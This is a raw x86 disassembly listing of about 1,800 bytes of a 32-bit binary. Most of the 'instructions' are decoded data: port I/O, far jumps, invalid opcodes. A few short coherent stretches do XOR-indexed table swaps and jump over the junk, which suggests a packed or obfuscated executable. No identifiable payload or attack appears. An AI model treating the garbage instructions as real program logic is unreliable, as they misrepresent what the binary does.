  40c8ae:	cmc    
  40c8af:	inc    esi
  40c8b0:	fdiv   DWORD PTR [edx-0x40]
  40c8b3:	mov    cl,0x66
  40c8b5:	loop   0x40c861
  40c8b7:	mov    DWORD PTR fs:[eax],ebx
  40c8ba:	mov    al,ds:0xdf3b1b64
  40c8bf:	aas    
  40c8c0:	mov    bh,0x1c
  40c8c2:	ror    bl,1
  40c8c4:	sub    dl,BYTE PTR [esi-0x72]
  40c8c7:	pusha  
  40c8c8:	push   0xfffffffc
  40c8ca:	jp     0x40c8e4
  40c8cc:	ins    BYTE PTR es:[edi],dx
  40c8cd:	mov    bh,0x0
  40c8cf:	ins    DWORD PTR es:[edi],dx
  40c8d0:	pop    edx
  40c8d1:	mov    esi,0xe226dd20
  40c8d6:	inc    ecx
  40c8d7:	fnstsw WORD PTR [ecx]
  40c8d9:	push   cs
  40c8da:	out    dx,eax
  40c8db:	xchg   ebp,eax
  40c8dc:	pop    ss
  40c8dd:	popa   
  40c8de:	xor    edx,DWORD PTR [edx+0x11611c01]
  40c8e4:	into   
  40c8e5:	aaa    
  40c8e6:	inc    ecx
  40c8e7:	mov    dh,0xc1
  40c8e9:	fimul  WORD PTR [ebp+0x7d]
  40c8ec:	add    al,0x8a
  40c8ee:	aad    0x1f
  40c8f0:	mov    ebp,0xa076c484
  40c8f5:	pop    ebx
  40c8f6:	jge    0x40c919
  40c8f8:	xor    BYTE PTR ss:0x30e85844,al
  40c8ff:	sahf   
  40c900:	scas   eax,DWORD PTR es:[edi]
  40c901:	loop   0x40c8d5
  40c903:	or     edx,ebx
  40c905:	mov    ecx,DWORD PTR [eax-0x1d]
  40c908:	xor    al,0x89
  40c90a:	mov    ebp,0x98d5018a
  40c90f:	mov    esp,eax
  40c911:	mov    al,ds:0x49e49971
  40c916:	leave  
  40c917:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c918:	jecxz  0x40c8c1
  40c91a:	inc    eax
  40c91b:	mov    ds:0x80fd1390,eax
  40c920:	fiadd  WORD PTR ds:0x1e8b5aae
  40c926:	and    eax,0x7db262cd
  40c92b:	xchg   esp,eax
  40c92c:	out    dx,eax
  40c92d:	mov    al,ds:0x39c9142e
  40c932:	in     eax,0xc9
  40c934:	(bad)  
  40c935:	cli    
  40c936:	ds dec edi
  40c938:	mov    esp,0x6b43f31a
  40c93d:	or     al,BYTE PTR [esi]
  40c93f:	xchg   edx,eax
  40c940:	(bad)  
  40c941:	or     ah,ah
  40c943:	ds (bad) 
  40c945:	add    edx,DWORD PTR [ebp-0x14]
  40c948:	mov    edi,DWORD PTR [ebp-0x1c]
  40c94b:	mov    dl,BYTE PTR [edx+edi*1+0x327299]
  40c952:	mov    BYTE PTR [ebp+0xf],dl
  40c955:	mov    edx,DWORD PTR [ebp-0xc]
  40c958:	xor    edx,eax
  40c95a:	add    edx,DWORD PTR [ebp-0x14]
  40c95d:	mov    edi,DWORD PTR [ebp-0x1c]
  40c960:	mov    dl,BYTE PTR [edx+edi*1+0x327299]
  40c967:	mov    BYTE PTR [ebp+0xb],dl
  40c96a:	mov    dl,BYTE PTR [ebp+0xf]
  40c96d:	mov    edi,DWORD PTR [ebp-0xc]
  40c970:	xor    edi,eax
  40c972:	add    edi,DWORD PTR [ebp-0x14]
  40c975:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c978:	mov    BYTE PTR [edi+ebx*1+0x327299],dl
  40c97f:	mov    dl,BYTE PTR [ebp+0xb]
  40c982:	mov    edi,DWORD PTR [ebp-0x18]
  40c985:	xor    edi,eax
  40c987:	add    edi,DWORD PTR [ebp-0x14]
  40c98a:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c98d:	jmp    0x40cda4
  40c992:	and    ebx,DWORD PTR [eax]
  40c994:	mov    al,0x9c
  40c996:	mov    ebp,0xbca9239c
  40c99b:	jne    0x40c9bf
  40c99d:	punpckhwd mm6,QWORD PTR [esi]
  40c9a0:	xchg   ebx,eax
  40c9a1:	cmp    al,0xca
  40c9a3:	xchg   edx,eax
  40c9a4:	jle    0x40ca24
  40c9a6:	jo     0x40ca21
  40c9a8:	jle    0x40ca28
  40c9aa:	retf   0xab92
  40c9ad:	adc    DWORD PTR [ecx],0x0
  40c9b0:	idiv   dl
  40c9b2:	test   al,0x66
  40c9b4:	imul   eax,DWORD PTR [ebp-0x4f0732b7],0x16be38cc
  40c9be:	fist   WORD PTR [edi]
  40c9c0:	cwde   
  40c9c1:	mov    ecx,0xeb5b11b2
  40c9c6:	cmp    ebp,esp
  40c9c8:	rol    BYTE PTR [esi+0xe00d922],1
  40c9ce:	lods   eax,DWORD PTR ds:[esi]
  40c9cf:	sub    eax,0xfe61d1c0
  40c9d4:	fnstcw WORD PTR [ecx]
  40c9d6:	test   BYTE PTR [ecx],0xc9
  40c9d9:	sar    BYTE PTR [ecx],1
  40c9db:	div    BYTE PTR ds:0x207bb67e
  40c9e1:	pop    ss
  40c9e2:	ret    0x428a
  40c9e5:	mov    bh,0x18
  40c9e7:	clc    
  40c9e8:	pop    edi
  40c9e9:	and    eax,0x8b56c946
  40c9ee:	push   eax
  40c9ef:	jo     0x40c9cb
  40c9f1:	adc    ebp,DWORD PTR [edi+ecx*8]
  40c9f4:	scas   al,BYTE PTR es:[edi]
  40c9f5:	stos   BYTE PTR es:[edi],al
  40c9f6:	and    dl,ch
  40c9f8:	(bad)  
  40c9f9:	mov    eax,ds:0x86c66074
  40c9fe:	pop    esi
  40c9ff:	jbe    0x40c9e9
  40ca01:	aam    0xf8
  40ca03:	fmul   QWORD PTR [edx+0x642f4f30]
  40ca09:	int3   
  40ca0a:	add    edx,0x19
  40ca0d:	popf   
  40ca0e:	push   0x52
  40ca10:	mov    dh,0xc5
  40ca12:	mov    eax,ds:0x8dea7909
  40ca17:	xor    ecx,DWORD PTR [bp+si]
  40ca1a:	inc    edx
  40ca1b:	(bad)  
  40ca1c:	jmp    0x816c:0x61cdbdeb
  40ca23:	hlt    
  40ca24:	lods   al,BYTE PTR ds:[esi]
  40ca25:	jnp    0x40ca81
  40ca27:	inc    esi
  40ca28:	cli    
  40ca29:	jo     0x40c9eb
  40ca2b:	nop
  40ca2c:	in     al,dx
  40ca2d:	jmp    0xbb3c:0x8e5dd041
  40ca34:	sbb    al,0xe
  40ca36:	jmp    0xc93973dc
  40ca3b:	inc    esi
  40ca3c:	push   ebp
  40ca3d:	sub    ebx,DWORD PTR [ebx-0x6c]
  40ca40:	aaa    
  40ca41:	jl     0x40ca51
  40ca43:	jae    0x40ca39
  40ca45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca46:	mov    ebp,0x2a98d0a6
  40ca4b:	test   DWORD PTR [edx-0x1e],esp
  40ca4e:	jnp    0x40ca0c
  40ca50:	jg     0x40ca7f
  40ca52:	mov    DWORD PTR [esi-0xa],esi
  40ca55:	lock mov bl,0x33
  40ca58:	sub    bh,bl
  40ca5a:	mov    dl,0x55
  40ca5c:	jg     0x40ca72
  40ca5e:	or     esp,DWORD PTR [esi]
  40ca60:	jp     0x40cab0
  40ca62:	push   esp
  40ca63:	dec    ecx
  40ca64:	mov    bl,0x9
  40ca66:	jg     0x40ca6d
  40ca68:	in     al,0x83
  40ca6a:	mov    esi,DWORD PTR [eax]
  40ca6c:	push   0xffffff84
  40ca6e:	mov    ah,BYTE PTR [eax]
  40ca70:	fcomp  st(0)
  40ca72:	pop    edi
  40ca73:	das    
  40ca74:	dec    esp
  40ca75:	xor    ebx,DWORD PTR [ebx-0x5e]
  40ca78:	jb     0x40cae9
  40ca7a:	inc    esp
  40ca7b:	clc    
  40ca7c:	aad    0x3e
  40ca7e:	xchg   ecx,eax
  40ca7f:	jge    0x40ca70
  40ca81:	out    dx,al
  40ca82:	push   ecx
  40ca83:	sbb    eax,DWORD PTR [ebp-0x293b09ad]
  40ca89:	sbb    eax,0x14a5b07
  40ca8e:	mov    edx,DWORD PTR [edi]
  40ca90:	stos   BYTE PTR es:[edi],al
  40ca91:	dec    edi
  40ca92:	rcl    BYTE PTR [esi+eiz*8-0x11226c68],0xbf
  40ca9a:	add    bh,cl
  40ca9c:	and    BYTE PTR [ebx],bh
  40ca9e:	xchg   ebx,eax
  40ca9f:	push   cs
  40caa0:	jno    0x40cacd
  40caa2:	mov    ah,0x67
  40caa4:	mov    dh,0x4f
  40caa6:	dec    esp
  40caa7:	inc    eax
  40caa8:	pop    ebx
  40caa9:	dec    ecx
  40caaa:	add    DWORD PTR [edx],ecx
  40caac:	fsubr  DWORD PTR [edx+0x650aae79]
  40cab2:	sub    dh,BYTE PTR [edi-0x303dcb96]
  40cab8:	xchg   ebp,eax
  40cab9:	lock lods eax,DWORD PTR ds:[esi]
  40cabb:	sub    DWORD PTR [esi+0x2e],ebx
  40cabe:	repnz loope 0x40ca47
  40cac1:	das    
  40cac2:	les    edx,FWORD PTR [ecx]
  40cac4:	jne    0x40ca66
  40cac6:	ss push edx
  40cac8:	or     eax,eax
  40caca:	cmp    DWORD PTR [edi+eax*8],eax
  40cacd:	sbb    esp,DWORD PTR [edi+0x7d]
  40cad0:	jp     0x40ca63
  40cad2:	xchg   ecx,eax
  40cad4:	dec    ebp
  40cad5:	jle    0x40ca9d
  40cad7:	mov    edx,0x8e91e045
  40cadc:	push   ecx
  40cadd:	hlt    
  40cade:	adc    eax,0x23a79cce
  40cae3:	xchg   esi,eax
  40cae4:	imul   eax,DWORD PTR [esi+0x20],0xccb96296
  40caeb:	mov    cl,0xbe
  40caed:	xor    DWORD PTR [esi-0xeda591],esp
  40caf3:	ja     0x40cb08
  40caf5:	jo     0x40cb24
  40caf7:	daa    
  40caf8:	xor    BYTE PTR [edi],bh
  40cafa:	inc    ebp
  40cafb:	push   ss
  40cafc:	add    bl,0xcd
  40caff:	data16 (bad) 
  40cb01:	push   esp
  40cb02:	pop    es
  40cb03:	stc    
  40cb04:	test   esi,esi
  40cb06:	mov    ds:0x4652512,eax
  40cb0b:	cmp    eax,0x15abda0d
  40cb10:	inc    bh
  40cb12:	ins    DWORD PTR es:[edi],dx
  40cb13:	mov    ds:0x246d7029,al
  40cb18:	jno    0x40caea
  40cb1a:	jecxz  0x40cb35
  40cb1c:	std    
  40cb1d:	xlat   BYTE PTR ds:[ebx]
  40cb1e:	cmp    cl,al
  40cb20:	push   esi
  40cb21:	adc    DWORD PTR [edx],esi
  40cb23:	lock jne 0x40cae9
  40cb26:	shl    BYTE PTR [ebp+0x5f],0x38
  40cb2a:	scas   eax,DWORD PTR es:[edi]
  40cb2b:	push   ebp
  40cb2c:	adc    eax,0x45463642
  40cb31:	xchg   edi,eax
  40cb32:	or     edi,DWORD PTR [ecx]
  40cb34:	fnsave [edx+0x4b]
  40cb37:	or     BYTE PTR [esi-0x32162ef],bh
  40cb3d:	xor    DWORD PTR [edi+eax*2+0x7317e606],eax
  40cb44:	pop    ebx
  40cb45:	pop    esp
  40cb46:	and    DWORD PTR [ecx-0x3221ffa8],edx
  40cb4c:	adc    BYTE PTR [edx+0x4d2cde7c],dl
  40cb52:	repz je 0x40cb20
  40cb55:	lock stc 
  40cb57:	mov    edx,0xfec2624a
  40cb5c:	mov    al,0xae
  40cb5e:	dec    esp
  40cb5f:	lock hlt 
  40cb61:	in     eax,dx
  40cb62:	mov    ds:0x4a5cec6d,eax
  40cb67:	mov    ds:0xd46c8077,al
  40cb6c:	xchg   BYTE PTR [eax+0x38074c3],al
  40cb72:	mov    bh,0x4b
  40cb74:	cmp    eax,0x55b20ed7
  40cb79:	nop
  40cb7a:	cdq    
  40cb7b:	adc    eax,0xfeb8ebb7
  40cb80:	enter  0xc223,0x3e
  40cb84:	mov    ds:0xcdd9543f,eax
  40cb89:	addr16 pop esi
  40cb8b:	jne    0x40cb75
  40cb8d:	fisubr DWORD PTR [edi+0x57c03eb7]
  40cb93:	sbb    eax,0xd4629b0c
  40cb98:	sub    dh,BYTE PTR [edx+0x503f1dbd]
  40cb9e:	ins    DWORD PTR es:[edi],dx
  40cb9f:	mov    bh,0xcf
  40cba1:	in     eax,0xcd
  40cba3:	mov    WORD PTR [edx-0x551c7fd8],ds
  40cba9:	xchg   ebp,eax
  40cbaa:	inc    esp
  40cbab:	fmul   QWORD PTR [esi+0x10]
  40cbae:	and    al,0x92
  40cbb0:	mov    DWORD PTR [edx],0x4776ce71
  40cbb6:	int3   
  40cbb7:	push   edx
  40cbb8:	loope  0x40cb7e
  40cbba:	bound  ecx,QWORD PTR [ebx]
  40cbbc:	nop
  40cbbd:	sub    al,0xf0
  40cbbf:	cmp    DWORD PTR [esi+eiz*4],esp
  40cbc2:	xchg   edx,eax
  40cbc3:	out    0xe1,al
  40cbc5:	div    DWORD PTR [ebp-0x55104f0c]
  40cbcb:	pop    edx
  40cbcc:	je     0x40cbcc
  40cbce:	sub    eax,0x6cc95dde
  40cbd3:	test   al,0x9f
  40cbd5:	jbe    0x40cc05
  40cbd7:	ins    BYTE PTR es:[edi],dx
  40cbd8:	cmp    esi,edi
  40cbda:	ja     0x40cbd3
  40cbdc:	popa   
  40cbdd:	dec    ebp
  40cbde:	add    DWORD PTR ss:0xbd68fd1e,edi
  40cbe5:	adc    dl,ch
  40cbe7:	pop    edi
  40cbe8:	(bad)
  40cbec:	push   ss
  40cbed:	ficom  WORD PTR [esi]
  40cbef:	aaa    
  40cbf0:	retf   
  40cbf1:	mov    cs,WORD PTR ds:0x1479ec5
  40cbf7:	pop    edi
  40cbf8:	out    0x61,al
  40cbfa:	and    al,0x63
  40cbfc:	and    DWORD PTR [edi-0x17],esi
  40cbff:	aam    0xe3
  40cc01:	push   ecx
  40cc02:	call   0xd9fca895
  40cc07:	mov    WORD PTR [edx-0xa],ds
  40cc0a:	xlat   BYTE PTR ds:[ebx]
  40cc0b:	ins    BYTE PTR es:[edi],dx
  40cc0c:	mov    edi,0x4459d648
  40cc11:	fwait
  40cc12:	pop    edi
  40cc13:	jns    0x40cbfa
  40cc15:	adc    BYTE PTR [ebp+0x6d],cl
  40cc18:	in     al,0xb6
  40cc1a:	dec    edx
  40cc1b:	pop    ebx
  40cc1c:	jns    0x40cc74
  40cc1e:	nop
  40cc1f:	and    eax,0x9e16a89b
  40cc24:	dec    eax
  40cc25:	int3   
  40cc26:	xchg   esp,eax
  40cc27:	and    eax,esi
  40cc29:	sbb    al,0xaa
  40cc2b:	and    BYTE PTR [edi+ecx*4+0x44e8147c],ah
  40cc32:	fdivrp st(2),st
  40cc34:	cmp    ch,bh
  40cc36:	push   edx
  40cc37:	in     eax,0xcf
  40cc39:	adc    al,0x16
  40cc3b:	mov    ebx,DWORD PTR [ecx]
  40cc3d:	loope  0x40cbc8
  40cc3f:	stc    
  40cc40:	mov    dl,0x83
  40cc42:	mov    gs,WORD PTR [edx+edi*1-0x2c]
  40cc46:	lods   eax,DWORD PTR ds:[esi]
  40cc47:	or     esi,DWORD PTR [ecx+0x30]
  40cc4a:	ins    BYTE PTR es:[edi],dx
  40cc4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc4c:	mov    ebp,0x95a2b1c9
  40cc51:	test   al,0x15
  40cc53:	mov    ebp,0xc79ff4c5
  40cc58:	or     eax,0x20b0e7f6
  40cc5d:	icebp  
  40cc5e:	xor    eax,0x9af6b10c
  40cc63:	ret    0xcbf9
  40cc66:	inc    esi
  40cc67:	cmp    eax,DWORD PTR [esp+ecx*4+0x60]
  40cc6b:	js     0x40cc09
  40cc6d:	cmc    
  40cc6e:	add    DWORD PTR [ebx],esp
  40cc70:	mov    dh,ch
  40cc72:	fcomp  DWORD PTR [esp+esi*2-0x9]
  40cc76:	out    dx,al
  40cc77:	dec    edx
  40cc78:	pop    ebp
  40cc79:	sti    
  40cc7a:	pop    eax
  40cc7b:	mov    esp,gs
  40cc7d:	fsub   QWORD PTR ds:0xe67a2aa4
  40cc83:	aaa    
  40cc84:	arpl   si,dx
  40cc86:	xchg   ecx,eax
  40cc87:	jl     0x40cc60
  40cc89:	xchg   esp,eax
  40cc8a:	dec    esp
  40cc8b:	sbb    BYTE PTR [edi+ebx*8-0x50],ch
  40cc8f:	xchg   edx,eax
  40cc90:	stos   DWORD PTR es:[edi],eax
  40cc91:	(bad)  
  40cc92:	jae    0x78d7ebb8
  40cc98:	or     eax,0xd3a18cef
  40cc9d:	dec    edx
  40cc9e:	inc    edx
  40cc9f:	mov    edx,DWORD PTR [edx-0x5bc5eebb]
  40cca5:	je     0x40cd12
  40cca7:	repz jmp 0x1a68:0x6b6260cc
  40ccaf:	jne    0x40ccb5
  40ccb1:	dec    ebp
  40ccb2:	cmc    
  40ccb3:	jecxz  0x40cd1a
  40ccb5:	into   
  40ccb6:	jmp    0x48057f50
  40ccbb:	(bad)  
  40ccbd:	jmp    0x6e2b:0x20b30a57
  40ccc4:	sbb    BYTE PTR [ecx],bh
  40ccc6:	xor    al,0x6
  40ccc8:	adc    BYTE PTR [edi],0x76
  40cccb:	cmc    
  40cccc:	mov    ds:0xc56ae528,al
  40ccd1:	fsub   QWORD PTR [ecx-0x157cd1b7]
  40ccd7:	inc    ebp
  40ccd8:	in     al,0xb3
  40ccda:	rcl    BYTE PTR [ebx-0x1cb5fda2],cl
  40cce0:	lods   al,BYTE PTR ds:[esi]
  40cce1:	test   eax,0x661cc23f
  40cce6:	aaa    
  40cce7:	inc    esi
  40cce8:	pop    es
  40cce9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ccea:	jp     0x40cc9e
  40ccec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cced:	xchg   DWORD PTR [esi+0x7e],esi
  40ccf0:	sbb    dl,BYTE PTR [ebx+0x4edee531]
  40ccf6:	inc    edi
  40ccf7:	jp     0x40ccd2
  40ccf9:	fisubr DWORD PTR [ecx+0x20]
  40ccfc:	daa    
  40ccfd:	(bad)  
  40ccfe:	cmp    bl,BYTE PTR [edi-0xa]
  40cd01:	das    
  40cd02:	stos   BYTE PTR es:[edi],al
  40cd03:	cmp    bl,dh
  40cd05:	mov    cl,0xe0
  40cd07:	cmp    cl,cl
  40cd09:	gs xchg esi,eax
  40cd0b:	ds inc edx
  40cd0d:	or     edx,DWORD PTR [ebx+ecx*8-0x47]
  40cd11:	jle    0x40cd36
  40cd13:	in     al,dx
  40cd14:	bts    ebp,esp
  40cd17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd18:	mov    dh,0x1e
  40cd1a:	pop    edx
  40cd1b:	mov    BYTE PTR [edx],ch
  40cd1d:	aaa    
  40cd1e:	jne    0x40ccb6
  40cd20:	inc    esi
  40cd21:	xor    al,0xdf
  40cd23:	das    
  40cd24:	mov    edx,0x4e198c8a
  40cd29:	xor    ah,BYTE PTR [edi]
  40cd2b:	mov    ?,WORD PTR [edi]
  40cd2d:	sahf   
  40cd2e:	aaa    
  40cd2f:	test   BYTE PTR [edx+eax*1],bh
  40cd32:	leave  
  40cd33:	push   ebx
  40cd34:	sbb    esp,DWORD PTR [edx+0x27]
  40cd37:	inc    esi
  40cd38:	jne    0x40cce0
  40cd3a:	jae    0x40cd74
  40cd3c:	(bad)  
  40cd3d:	rcr    edx,1
  40cd3f:	pop    ecx
  40cd40:	mov    eax,ds:0xca2708c
  40cd45:	js     0x40ccd0
  40cd47:	add    ecx,DWORD PTR [edx+0x1]
  40cd4a:	mov    bh,0xe8
  40cd4c:	mov    DWORD PTR [esi+0x23220d46],edi
  40cd52:	jge    0x40ccf4
  40cd54:	retf   
  40cd55:	dec    ecx
  40cd56:	mov    ah,0xc0
  40cd58:	or     eax,0x626e1f0e
  40cd5d:	mov    esi,0xa361b447
  40cd62:	clc    
  40cd63:	dec    edx
  40cd64:	or     BYTE PTR [ebx-0x57ee075c],dh
  40cd6a:	or     eax,0xb4cd0292
  40cd6f:	mov    eax,ds:0x28165753
  40cd74:	mov    dh,0xc6
  40cd76:	and    al,0x17
  40cd78:	dec    ebx
  40cd79:	inc    edx
  40cd7a:	test   DWORD PTR gs:[edi+eiz*4],esi
  40cd7e:	cmp    cl,BYTE PTR [eax+eiz*4-0x71]
  40cd82:	nop
  40cd83:	bound  ecx,QWORD PTR [ecx]
  40cd85:	hlt    
  40cd86:	(bad)  
  40cd87:	sub    DWORD PTR [ebx+0x71],esi
  40cd8a:	rol    BYTE PTR [eax],cl
  40cd8c:	cmp    DWORD PTR [edi+0x6f47cef5],ebp
  40cd92:	ins    DWORD PTR es:[edi],dx
  40cd93:	adc    al,0xc2
  40cd95:	push   esp
  40cd96:	mov    edi,0x709c538d
  40cd9b:	pop    edx
  40cd9c:	or     BYTE PTR [ebx+0x8],dl
  40cd9f:	inc    edx
  40cda0:	xchg   edx,eax
  40cda1:	jno    0x40cdc2
  40cda3:	sub    cl,BYTE PTR [eax+0x72991f94]
  40cda9:	xor    al,BYTE PTR [eax]
  40cdab:	mov    edx,DWORD PTR [ebp-0x44]
  40cdae:	mov    edi,DWORD PTR [ebp-0xc]
  40cdb1:	xor    edx,eax
  40cdb3:	xor    edi,eax
  40cdb5:	add    edx,ecx
  40cdb7:	add    edi,ecx
  40cdb9:	imul   edx,edi
  40cdbc:	add    edx,DWORD PTR [ebp-0x14]
  40cdbf:	mov    DWORD PTR [ebp-0x14],edx
  40cdc2:	mov    edx,DWORD PTR [ebp-0xc]
  40cdc5:	mov    edi,DWORD PTR [ebp-0x24]
  40cdc8:	jmp    0x40d1df
  40cdcd:	push   ebp
  40cdce:	and    DWORD PTR [edx+esi*8],eax
  40cdd1:	jl     0x40cdc6
  40cdd3:	jge    0x40cd76
  40cdd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cdd6:	sbb    esi,DWORD PTR [eax+0x58]
  40cdd9:	inc    ebp
  40cdda:	xchg   DWORD PTR [esi+0x7e9ecc90],esi
  40cde0:	jle    0x40ce52
  40cde2:	jns    0x40ce62
  40cde4:	jle    0x40ce03
  40cde6:	and    bh,BYTE PTR [edi+eiz*8-0x4d]
  40cdea:	pusha  
  40cdeb:	pushf  
  40cdec:	xchg   ecx,eax
  40cded:	push   0xee659700
  40cdf2:	mov    edi,0xf661f2ad
  40cdf7:	scas   eax,DWORD PTR es:[edi]
  40cdf8:	retf   0xa803
  40cdfb:	data16 outs dx,BYTE PTR ds:[esi]
  40cdfd:	xlat   BYTE PTR ds:[ebx]
  40cdfe:	ds and DWORD PTR ds:[esi-0x7cc2603a],ecx
  40ce06:	lods   eax,DWORD PTR ds:[esi]
  40ce07:	adc    ebx,DWORD PTR [ebx+0x38483585]
  40ce0d:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40ce0f:	imul   ebx,DWORD PTR [ecx],0xea920ed8
  40ce15:	mov    edi,0x9372be36
  40ce1a:	mov    ds:0xa1a82c1a,al
  40ce1f:	sub    DWORD PTR ds:0x2fe8479e,ecx
  40ce25:	imul   edi,DWORD PTR [ecx],0x8c28b8ef
  40ce2b:	out    0x65,eax
  40ce2d:	aam    0x10
  40ce2f:	or     ah,bh
  40ce31:	xor    al,0xce
  40ce33:	xchg   ebp,eax
  40ce34:	(bad)  
  40ce35:	rol    DWORD PTR [eax-0x58cbbdda],cl
  40ce3b:	ja     0x40ce48
  40ce3d:	(bad)  
  40ce3e:	pop    ds
  40ce3f:	mov    ch,0x6e
  40ce41:	push   ss
  40ce42:	pop    esi
  40ce43:	repz (bad) 
  40ce45:	retf   0xbb84
  40ce48:	sahf   
  40ce49:	call   ecx
  40ce4b:	xchg   esi,eax
  40ce4c:	cwde   
  40ce4d:	ins    DWORD PTR es:[edi],dx
  40ce4e:	dec    esi
  40ce4f:	jmp    0xf893576c
  40ce54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce55:	jmp    0x40ce15
  40ce57:	jge    0x40ce89
  40ce59:	iret   
  40ce5a:	cmc    
  40ce5b:	push   ecx
  40ce5c:	jbe    0x40ce11
  40ce5e:	push   edi
  40ce5f:	dec    esp
  40ce60:	and    al,0xe1
  40ce62:	pop    ebp
  40ce63:	pop    eax
  40ce64:	jae    0x40cdfa
  40ce66:	sub    ebp,DWORD PTR [ecx]
  40ce68:	stos   DWORD PTR es:[edi],eax
  40ce69:	aas    
  40ce6a:	jns    0x40ceea
  40ce6c:	xchg   ecx,eax
  40ce6d:	rcr    BYTE PTR [eax],1
  40ce6f:	rcl    ecx,0x7
  40ce72:	add    al,0x66
  40ce74:	jne    0x40ce0c
  40ce76:	and    al,0xf1
  40ce78:	pop    ecx
  40ce79:	sbb    DWORD PTR [ebx],ebx
  40ce7b:	sbb    al,0x23
  40ce7d:	mov    ds:0xe092da39,eax
  40ce82:	cld    
  40ce83:	pop    ecx
  40ce84:	xchg   edx,eax
  40ce85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce86:	mov    BYTE PTR [ecx-0x1549001b],cl
  40ce8c:	rcl    ebx,1
  40ce8e:	call   0xe9ef0f92
  40ce93:	mov    edx,0x5f076b70
  40ce98:	xchg   ebp,eax
  40ce99:	xor    ebx,DWORD PTR [edi+0x7be7c076]
  40ce9f:	jnp    0x111b
  40cea4:	mov    cl,0x62
  40cea6:	lahf   
  40cea7:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40cea9:	jecxz  0x40ceb8
  40ceab:	(bad)  
  40ceac:	sbb    DWORD PTR [ebx-0x3a],edx
  40ceaf:	int3   
  40ceb0:	jne    0x40ce3e
  40ceb2:	sbb    dh,BYTE PTR [edx]
  40ceb4:	push   cs
  40ceb5:	popa   
  40ceb6:	bound  ecx,QWORD PTR [ebp+eax*4-0xb]
  40ceba:	(bad)  
  40cebb:	rcl    BYTE PTR [ebx+0x14],0x9e
  40cebf:	outs   dx,DWORD PTR ds:[esi]
  40cec0:	mov    WORD PTR [edx],ss
  40cec2:	or     BYTE PTR [edi-0x7f],0xe5
  40cec6:	inc    edi
  40cec7:	leave  
  40cec8:	sbb    esi,DWORD PTR [ebx+0x11]
  40cecb:	pop    ebx
  40cecc:	(bad)  [edi]
  40cece:	inc    ebp
  40cecf:	mov    ds:0x9147cf5f,eax
  40ced4:	fwait
  40ced5:	xor    al,0x1
  40ced7:	cdq    
  40ced8:	hlt    
  40ced9:	sbb    ah,dh
  40cedb:	and    dl,BYTE PTR [edx]
  40cedd:	test   eax,0xe1e084f5
  40cee2:	mov    esp,0x109fbfe
  40cee7:	cmp    ebp,edi
  40cee9:	out    dx,eax
  40ceea:	nop
  40ceeb:	arpl   si,di
  40ceed:	push   cs
  40ceee:	sahf   
  40ceef:	cwde   
  40cef0:	pushf  
  40cef1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cef2:	push   ss
  40cef3:	bound  esi,QWORD PTR [edx]
  40cef5:	mov    ecx,DWORD PTR [ebp-0x592645ee]
  40cefb:	pop    ss
  40cefc:	retf   0xf7f2
  40ceff:	cmp    eax,0x67e1e4d0
  40cf04:	add    bh,ch
  40cf06:	jo     0x40ce8f
  40cf08:	mov    dl,0xb2
  40cf0a:	(bad)  
  40cf0b:	pop    ds
  40cf0c:	enter  0x3f39,0x51
  40cf10:	mov    bl,0x88
  40cf12:	or     edi,DWORD PTR [ebp-0x42]
  40cf15:	fiadd  DWORD PTR [ebp+0x6fae11b6]
  40cf1b:	rol    BYTE PTR [esi+edx*2-0x12519575],1
  40cf22:	xchg   esi,eax
  40cf23:	fucomi st,st(4)
  40cf25:	and    al,BYTE PTR [esp+ecx*2-0x48e265a0]
  40cf2c:	popa   
  40cf2d:	xlat   BYTE PTR ds:[ebx]
  40cf2e:	pop    ss
  40cf2f:	dec    esi
  40cf30:	mov    bl,0x2
  40cf32:	inc    ecx
  40cf33:	iret   
  40cf34:	adc    cl,BYTE PTR [ebp-0x562820cb]
  40cf3a:	adc    al,BYTE PTR [edi]
  40cf3c:	push   0x6d82571d
  40cf41:	mov    ecx,0xe10541b0
  40cf46:	lds    eax,FWORD PTR [ecx]
  40cf48:	jg     0x40cf58
  40cf4a:	mov    ebx,DWORD PTR [ebp+0x20]
  40cf4d:	out    0xae,al
  40cf4f:	pop    ebx
  40cf50:	mul    BYTE PTR [edi+0x436d91fa]
  40cf56:	jg     0x40cf96
  40cf58:	sbb    DWORD PTR [edx-0x40],eax
  40cf5b:	pop    edi
  40cf5c:	jbe    0x40cf45
  40cf5e:	cli    
  40cf5f:	stos   DWORD PTR es:[edi],eax
  40cf60:	xor    BYTE PTR [edi+0x4c9c0ab7],dl
  40cf66:	packsswb mm7,QWORD PTR [edx-0x1901a279]
  40cf6d:	cmc    
  40cf6e:	jmp    FWORD PTR [edi-0x3f684978]
  40cf74:	cmp    DWORD PTR [ebx+0x6b],0xe2d2e8ab
  40cf7b:	mov    BYTE PTR [ebx+0x5],bl
  40cf7e:	out    0xa1,al
  40cf80:	xor    DWORD PTR [esi-0x4f],edi
  40cf83:	sahf   
  40cf84:	jmp    0x40d001
  40cf86:	div    edi
  40cf88:	push   esi
  40cf89:	in     al,0xe1
  40cf8b:	push   ss
  40cf8c:	test   dh,dl
  40cf8e:	fnstenv [ebx+0x68]
  40cf91:	mov    bh,0xd
  40cf93:	sub    DWORD PTR [ebx-0x33],0x314f17bc
  40cf9a:	inc    edx
  40cf9b:	repnz std 
  40cf9d:	mov    ebx,0x20957d55
  40cfa2:	add    BYTE PTR cs:[ecx+edx*8-0x51],al
  40cfa7:	jae    0x40cf4b
  40cfa9:	test   eax,0xa6077aa6
  40cfae:	or     eax,0xffffffea
  40cfb1:	ins    DWORD PTR es:[edi],dx
  40cfb2:	out    0xfb,al
  40cfb4:	nop
  40cfb5:	data16 cmp dh,al
  40cfb8:	mov    BYTE PTR [ebx+0x4e3406a0],cl
  40cfbe:	scas   al,BYTE PTR es:[edi]
  40cfbf:	cmp    al,0x13
